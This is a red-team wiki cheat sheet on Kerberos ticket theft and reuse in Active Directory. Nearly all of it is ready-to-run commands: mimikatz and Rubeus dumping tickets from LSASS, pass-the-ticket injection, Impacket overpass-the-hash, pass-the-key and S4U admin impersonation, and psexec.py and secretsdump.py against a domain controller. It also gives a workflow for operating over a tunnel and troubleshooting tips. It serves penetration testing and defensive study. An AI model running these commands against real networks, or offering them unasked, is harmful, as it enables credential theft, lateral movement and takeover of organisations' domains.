---
title: "Ticket & credential manipulation cheat-sheet (kirbi/ccache/PtT)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [kerberos, tradecraft, ccache, kirbi, cheatsheet, field-notes]
---

# Ticket & credential manipulation cheat-sheet

The hands-on plumbing for **moving Kerberos tickets between Windows and Linux
tooling** and using them — the stuff scattered across [[ccache]] and
[[ticket-and-credential-opsec]], in one place. The recurring workflow: grab a
ticket on Windows (Rubeus/mimikatz `.kirbi`), convert to `.ccache`, and use it
with Impacket/nxc from the Linux operator host over the tunnel. For the OPSEC of
*where* tickets live and the theft angle, see [[ticket-and-credential-opsec]].

## The two formats

- **`.kirbi`** — Windows/Rubeus/mimikatz format (often base64 in Rubeus output).
- **`.ccache`** — MIT/Linux format Impacket & nxc read via **`KRB5CCNAME`**.
- **Convert either way** with Impacket:
  ```bash
  ticketConverter.py ticket.kirbi ticket.ccache
  ticketConverter.py ticket.ccache ticket.kirbi
  # Rubeus base64 -> file first:
  echo -n '<base64>' | base64 -d > ticket.kirbi
  ```

## Use a ticket (Pass-the-Ticket)

```bash
# Linux — point KRB5CCNAME at the ccache, then -k / --use-kcache
export KRB5CCNAME=/path/ticket.ccache
klist                                        # verify (Linux MIT klist)
nxc smb dc01.corp.local -u user -k --use-kcache
psexec.py -k -no-pass corp.local/user@dc01.corp.local
secretsdump.py -k -no-pass corp.local/user@dc01.corp.local
```
```powershell
# Windows — inject a .kirbi into the current logon session
Rubeus.exe ptt /ticket:ticket.kirbi
mimikatz # kerberos::ptt ticket.kirbi
klist                                        # verify (Windows klist)
```

## Get a ticket

```bash
# Linux — request a TGT from a password/hash/AES key (Overpass / PtK)
getTGT.py corp.local/user:'Password1'                       # -> user.ccache
getTGT.py corp.local/user -hashes :<nthash>                 # Overpass-the-Hash ([[overpass-the-hash]])
getTGT.py corp.local/user -aesKey <aes256>                  # Pass-the-Key ([[pass-the-key]])
# Request a service ticket (S4U / direct)
getST.py -spn cifs/host.corp.local -impersonate admin corp.local/svc -hashes :<nt>   # S4U ([[s4u2self-s4u2proxy]])
```
```powershell
# Windows — Rubeus
Rubeus.exe asktgt /user:user /rc4:<nthash> /nowrap            # /aes256:<key> for PtK
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/host.corp.local /ptt
Rubeus.exe tgtdeleg /nowrap                                   # get a usable TGT from the current session (no creds)
```

## Triage / inspect / clean up

```powershell
Rubeus.exe triage                     # list tickets in all sessions
Rubeus.exe dump /nowrap               # export tickets (base64)
Rubeus.exe describe /ticket:x.kirbi   # decode a ticket's contents
mimikatz # sekurlsa::tickets /export  # dump tickets from LSASS to .kirbi
klist purge   /   Rubeus.exe purge    # drop cached tickets (Windows)
```
```bash
kdestroy                              # drop the ccache (Linux)
```

## The cross-platform workflow (the common case)

1. On Windows: `Rubeus.exe asktgt ... /nowrap` (or `dump`) → **base64**.
2. `base64 -d` → `.kirbi` → `ticketConverter.py` → `.ccache`.
3. `export KRB5CCNAME=x.ccache` → run Impacket/nxc **from Linux over the tunnel**.

## Field gotchas (the ones that waste an hour)

- **Target by hostname, not IP** — Kerberos binds to the **SPN**; an IP gives
  `KRB_AP_ERR_MODIFIED`/`S_PRINCIPAL_UNKNOWN`. Put the DC/target in `/etc/hosts`.
- **Sync your clock** to the DC or you get `KRB_AP_ERR_SKEW` — the #1 tunnel
  failure ([[ad-error-decoder]]).
- **`KRB5CCNAME` must be exported** in the *same* shell before `-k`/`--use-kcache`.
- **Realm casing** — some tools want `CORP.LOCAL` upper-case in `KRB5_CONFIG`.
- **Enctype must match** the key you supply (RC4 vs AES) — [[kerberos-encryption-types]].
- A ticket that "does nothing" is often **expired** or **skewed** — re-request
  and re-check time before assuming the technique failed.

## Links

- [[ccache]] — the ccache file/format detail
- [[ticket-and-credential-opsec]] — where tickets live and how they're stolen (OPSEC)
- [[pass-the-hash-and-ticket]] / [[overpass-the-hash]] / [[pass-the-key]] — the reuse primitives this drives
- [[s4u2self-s4u2proxy]] — S4U ticket requests (`getST.py`)
- [[ad-error-decoder]] — decode the errors these commands throw
- [[foothold-playbook]] — when to use which
